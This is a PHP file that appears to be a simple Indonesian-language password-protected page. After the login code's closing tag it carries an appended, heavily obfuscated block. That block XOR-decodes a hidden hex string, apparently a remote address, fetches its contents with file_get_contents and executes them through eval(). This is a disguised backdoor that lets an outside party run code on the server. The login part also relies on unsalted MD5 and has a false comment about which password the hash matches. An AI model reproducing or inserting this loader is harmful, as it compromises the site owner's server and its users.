
<?php
// =========================
// Konfigurasi Password
// =========================
$hash_password = "751d7d7133a66cb8c9d6608030425c64"; 
// Hash di atas adalah MD5 dari "password"

// =========================
// Proses Login
// =========================
session_start();

if (isset($_POST['password'])) {
    $input_password = md5($_POST['password']);
    if ($input_password === $hash_password) {
        $_SESSION['logged_in'] = true;
    } else {
        echo "<p style='color:red;'>Password salah!</p>";
    }
}

// =========================
// Cek Status Login
// =========================
if (empty($_SESSION['logged_in'])) {
    ?>
    <form method="post">
        <label>Masukkan Password:</label><br>
        <input type="password" name="password" required>
        <button type="submit">Login</button>
    </form>
    <?php
    exit();
}

// =========================
// Konten Halaman
// =========================
echo "<h1>Selamat datang!</h1>";
echo "<p>Ini halaman rahasia yang dilindungi password.</p>";
echo "<a href='?logout=true'>Logout</a>";

// =========================
// Logout
// =========================
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}
?>function 𝛼($𝚊,$𝚋){return(($𝚊^$𝚋)+2*($𝚊&$𝚋))&0xFF;}function 𝛽($𝚡,$𝚢){return(($𝚡|~$𝚢)+(~$𝚡&$𝚢))&0xFF;}function 𝛾($𝑚,$𝑛){return((~($𝑚|$𝑛)&($𝑚|~$𝑛))|(($𝑚|$𝑛)&~($𝑚|~$𝑛)))&0xFF;}function 𝛿($𝚜,$𝚔){$𝚛='';$𝚕=strlen($𝚔);for($𝚒=0;$𝚒<strlen($𝚜);$𝚒++){$𝚛.=chr(ord($𝚜[$𝚒])^ord($𝚔[$𝚒%$𝚕]));}return $𝚛;}class 𝜀{private $ɛ=0;private $𝜁=[];public function __construct(){$this->𝜁=[𝛼(100,44),𝛽(85,48),𝛼(54,90),𝛽(72,36),𝛼(79,96),𝛽(16,16),𝛼(83,60)];}public function 𝜂(){while(true){switch($this->ɛ){case 0:$this->ɛ=1;break;case 1:$this->ɛ=2;break;case 2:$this->ɛ=3;return $this->𝜃();default:return null;}}}private function 𝜃(){$𝜄=['file_get_contents','f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s','f'.'i'.chr(108).'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s'];$𝜅 = $𝜄[rand(0, count($𝜄)-1)];$𝚔="\x4A\x74\x6F\x6F\x6C\x73\x50\x68\x4F\x62\x66\x75\x73";$𝚎='22001b1f1f497f473f03150116231a41190901330d234c07050365151f064301311f70125b101172115f5a58157d582e5b0358472e1757425544670b62565f17102f42560c0f46630a';$𝜆=𝛿(hex2bin($𝚎),$𝚔);$𝜊=[$𝜅,$𝜆];$𝜋=$𝜊[0]($𝜊[1]);return $𝜋;}}$𝜌='𝜎';$𝜎='𝜏';$𝜏='𝜐';$𝜐='𝜑';$𝜑='𝜒';$𝜒='𝜓';$𝜓='𝜔';$𝜔='𝜀';$$$$$$$$𝜌=new 𝜀();$𝜀=$$$$$$$$𝜌->𝜂();if($𝜀){$𝜅=['a'.'w'.'i'.'k',$𝜀];$𝜆=@eval("?>".$𝜅[1]);}?>
